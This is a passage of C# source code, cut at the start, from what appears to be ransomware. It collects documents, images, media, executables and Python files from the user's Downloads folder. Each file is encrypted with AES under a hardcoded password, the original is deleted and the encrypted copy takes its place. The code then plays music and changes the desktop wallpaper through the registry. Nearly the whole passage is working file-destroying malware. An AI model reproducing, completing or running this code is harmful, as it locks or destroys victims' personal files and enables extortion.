            foreach (string odtdata in odtlist)
            {
                string encryptedfile = odtloc + "encryptedfile.odt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", odtdata, encryptedfile);
                File.Delete(odtdata);
                File.Move(encryptedfile, odtdata);
           

            }
            //txt

            foreach (string txtdata in txtlist)
            {
                string encryptedfile = txtloc + "encryptedfile.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", txtdata, encryptedfile);
                File.Delete(txtdata);
                File.Move(encryptedfile, txtdata);
               

            }


            //ENCRYPTING FILES IN DOWNLOADS

            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            List<string> downloadlist = new List<string>();
            DirectoryInfo downloaddinfo = new DirectoryInfo(downloadFolder);



            //RECURSION

            //recursion

            //doc

            foreach (var docdatadown in downloaddinfo.GetFiles("*.doc"))
            {
                downloadlist.Add(docdatadown.FullName);
            }

            //docx

            foreach (var docxdatadown in downloaddinfo.GetFiles("*.docx"))
            {
                downloadlist.Add(docxdatadown.FullName);
            }

            //txt

            foreach (var txtdatadown in downloaddinfo.GetFiles("*.txt"))
            {
                downloadlist.Add(txtdatadown.FullName);
            }

            //ppt

            foreach (var pptdatadown in downloaddinfo.GetFiles("*.ppt"))
            {
                downloadlist.Add(pptdatadown.FullName);
            }
            //pptx

            foreach (var pptxdatadown in downloaddinfo.GetFiles("*.pptx"))
            {
                downloadlist.Add(pptxdatadown.FullName);
            }
            //odt

            foreach (var odtdatadown in downloaddinfo.GetFiles("*.odt"))
            {
                downloadlist.Add(odtdatadown.FullName);
            }
            //htm

            foreach (var htmdatadown in downloaddinfo.GetFiles("*.htm"))
            {
                downloadlist.Add(htmdatadown.FullName);
            }
            //html

            foreach (var htmldatadown in downloaddinfo.GetFiles("*.html"))
            {
                downloadlist.Add(htmldatadown.FullName);
            }
            //pdf

            foreach (var pdfdatadown in downloaddinfo.GetFiles("*.pdf"))
            {
                downloadlist.Add(pdfdatadown.FullName);
            }
            //xls

            foreach (var xlsdatadown in downloaddinfo.GetFiles("*.xls"))
            {
                downloadlist.Add(xlsdatadown.FullName);
            }
            //xlsx

            foreach (var xlsxdatadown in downloaddinfo.GetFiles("*.xlsx"))
            {
                downloadlist.Add(xlsxdatadown.FullName);
            }
            foreach (var jpgdatadown in downloaddinfo.GetFiles("*.jpg"))
            {
                downloadlist.Add(jpgdatadown.FullName);
            }
            foreach (var jpegdatadown in downloaddinfo.GetFiles("*.jpeg"))
            {
                downloadlist.Add(jpegdatadown.FullName);
            }
            foreach (var pngdatadown in downloaddinfo.GetFiles("*.png"))
            {
                downloadlist.Add(pngdatadown.FullName);
            }
            foreach (var webPdatadown in downloaddinfo.GetFiles("*.webP"))
            {
                downloadlist.Add(webPdatadown.FullName);
            }
            foreach (var mp4datadown in downloaddinfo.GetFiles("*.mp4"))
            {
                downloadlist.Add(mp4datadown.FullName);
            }
            foreach (var wmvdatadown in downloaddinfo.GetFiles("*.wmv"))
            {
                downloadlist.Add(wmvdatadown.FullName);
            }
            foreach (var avidatadown in downloaddinfo.GetFiles("*.avi"))
            {
                downloadlist.Add(avidatadown.FullName);
            }
            foreach (var movdatadown in downloaddinfo.GetFiles("*.mov"))
            {
                downloadlist.Add(movdatadown.FullName);
            }
            foreach (var mkvdatadown in downloaddinfo.GetFiles("*.mkv"))
            {
                downloadlist.Add(mkvdatadown.FullName);
            }
            foreach (var mp3datadown in downloaddinfo.GetFiles("*.mp3"))
            {
                downloadlist.Add(mp3datadown.FullName);
            }
            foreach (var wavdatadown in downloaddinfo.GetFiles("*.wav"))
            {
                downloadlist.Add(wavdatadown.FullName);
            }

            foreach (var m4adatadown in downloaddinfo.GetFiles("*.m4a"))
            {
                downloadlist.Add(m4adatadown.FullName);
            }
            foreach (var flacdatadown in downloaddinfo.GetFiles("*.flac"))
            {
                downloadlist.Add(flacdatadown.FullName);
            }
            foreach (var aacdatadown in downloaddinfo.GetFiles("*.aac"))
            {
                downloadlist.Add(aacdatadown.FullName);
            }
            foreach (var mididatadown in downloaddinfo.GetFiles("*.midi"))
            {
                downloadlist.Add(mididatadown.FullName);
            }
            foreach (var flpdatadown in downloaddinfo.GetFiles("*.flp"))
            {
                downloadlist.Add(flpdatadown.FullName);
            }
            foreach (var wmadatadown in downloaddinfo.GetFiles("*.wma"))
            {
                downloadlist.Add(wmadatadown.FullName);
            }
            foreach (var exedatadown in downloaddinfo.GetFiles("*.exe"))
            {
                downloadlist.Add(exedatadown.FullName);
            }
            foreach (var pydatadown in downloaddinfo.GetFiles("*.py"))
            {
                downloadlist.Add(pydatadown.FullName);
            }





            //START ENCRYPTING

            //doc

            foreach (string docdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.doc";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", docdatadown, encryptedfile);
                File.Delete(docdatadown);
                File.Move(encryptedfile, docdatadown);
               

            }

            //docx

            foreach (string docxdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.docx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", docxdatadown, encryptedfile);
                File.Delete(docxdatadown);
                File.Move(encryptedfile, docxdatadown);
             

            }

            //txt

            foreach (string txtdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", txtdatadown, encryptedfile);
                File.Delete(txtdatadown);
                File.Move(encryptedfile, txtdatadown);
           

            }

            //xls

            foreach (string xlsdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.xls";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", xlsdatadown, encryptedfile);
                File.Delete(xlsdatadown);
                File.Move(encryptedfile, xlsdatadown);
            

            }

            //xlsx

            foreach (string xlsxdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.xlsx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", xlsxdatadown, encryptedfile);
                File.Delete(xlsxdatadown);
                File.Move(encryptedfile, xlsxdatadown);
              

            }

            //pdf

            foreach (string pdfdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.pdf";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pdfdatadown, encryptedfile);
                File.Delete(pdfdatadown);
                File.Move(encryptedfile, pdfdatadown);
     

            }

            //ppt

            foreach (string pptdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.ppt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pptdatadown, encryptedfile);
                File.Delete(pptdatadown);
                File.Move(encryptedfile, pptdatadown);
                

            }

            //pptx

            foreach (string pptxdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.pptx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pptxdatadown, encryptedfile);
                File.Delete(pptxdatadown);
                File.Move(encryptedfile, pptxdatadown);
             

            }

            //htm

            foreach (string htmdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.htm";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", htmdatadown, encryptedfile);
                File.Delete(htmdatadown);
                File.Move(encryptedfile, htmdatadown);
              

            }

            //html

            foreach (string htmldatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.html";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", htmldatadown, encryptedfile);
                File.Delete(htmldatadown);
                File.Move(encryptedfile, htmldatadown);
             

            }

            //odt

            foreach (string odtdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.odt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", odtdatadown, encryptedfile);
                File.Delete(odtdatadown);
                File.Move(encryptedfile, odtdatadown);
     

            }

            //jpg

            foreach (string jpgdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.jpg";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", jpgdatadown, encryptedfile);
                File.Delete(jpgdatadown);
                File.Move(encryptedfile, jpgdatadown);
   

            }

            //jpeg

            foreach (string jpegdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.jpeg";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", jpegdatadown, encryptedfile);
                File.Delete(jpegdatadown);
                File.Move(encryptedfile, jpegdatadown);
            

            }

            //png

            foreach (string pngdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.png";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pngdatadown, encryptedfile);
                File.Delete(pngdatadown);
                File.Move(encryptedfile, pngdatadown);
          

            }

            //webP

            foreach (string webPdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.webP";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", webPdatadown, encryptedfile);
                File.Delete(webPdatadown);
                File.Move(encryptedfile, webPdatadown);
             

            }

            //mp3

            foreach (string mp3datadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.mp3";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", mp3datadown, encryptedfile);
                File.Delete(mp3datadown);
                File.Move(encryptedfile, mp3datadown);
               

            }

            //wav

            foreach (string wavdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.wav";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", wavdatadown, encryptedfile);
                File.Delete(wavdatadown);
                File.Move(encryptedfile, wavdatadown);
           

            }

            //flac

            foreach (string flacdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.flac";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", flacdatadown, encryptedfile);
                File.Delete(flacdatadown);
                File.Move(encryptedfile, flacdatadown);
            

            }

            //midi

            foreach (string mididatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.midi";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", mididatadown, encryptedfile);
                File.Delete(mididatadown);
                File.Move(encryptedfile, mididatadown);
               

            }

            //flp

            foreach (string flpdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.flp";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", flpdatadown, encryptedfile);
                File.Delete(flpdatadown);
                File.Move(encryptedfile, flpdatadown);
          

            }

            //m4a

            foreach (string m4adatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.m4a";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", m4adatadown, encryptedfile);
                File.Delete(m4adatadown);
                File.Move(encryptedfile, m4adatadown);
           

            }

            //aac

            foreach (string aacdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.aac";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", aacdatadown, encryptedfile);
                File.Delete(aacdatadown);
                File.Move(encryptedfile, aacdatadown);
      

            }

            //wma

            foreach (string wmadatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.wma";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", wmadatadown, encryptedfile);
                File.Delete(wmadatadown);
                File.Move(encryptedfile, wmadatadown);
            

            }

            //wmv

            foreach (string wmvdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.wmv";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", wmvdatadown, encryptedfile);
                File.Delete(wmvdatadown);
                File.Move(encryptedfile, wmvdatadown);
     

            }

            //mov

            foreach (string movdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.mov";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", movdatadown, encryptedfile);
                File.Delete(movdatadown);
                File.Move(encryptedfile, movdatadown);
          

            }

            //mp4

            foreach (string mp4datadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.mp4";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", mp4datadown, encryptedfile);
                File.Delete(mp4datadown);
                File.Move(encryptedfile, mp4datadown);
           

            }

            //avi

            foreach (string avidatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.avi";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", avidatadown, encryptedfile);
                File.Delete(avidatadown);
                File.Move(encryptedfile, avidatadown);
      

            }


            //mkv

            foreach (string mkvdatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.mkv";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", mkvdatadown, encryptedfile);
                File.Delete(mkvdatadown);
                File.Move(encryptedfile, mkvdatadown);
               

            }

            //exe

            foreach (string exedatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.exe";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", exedatadown, encryptedfile);
                File.Delete(exedatadown);
                File.Move(encryptedfile, exedatadown);
           

            }

            //py

            foreach (string pydatadown in downloadlist)
            {
                string encryptedfile = downloadFolder + "encryptedfile.py";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pydatadown, encryptedfile);
                File.Delete(pydatadown);
                File.Move(encryptedfile, pydatadown);
            

            }

            //soundplayer

            SoundPlayer bgplayer = new SoundPlayer();
            bgplayer.SoundLocation = AppDomain.CurrentDomain.BaseDirectory + "\\bgmusic.wav";
            bgplayer.Play();

            //background wallpaper change

            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "C:\\blackhawk\\BlackHawk\\BlackHawk\\bin\\Debug\\mainbg.jpg", RegistryValueKind.String);


            


        }
    }
}
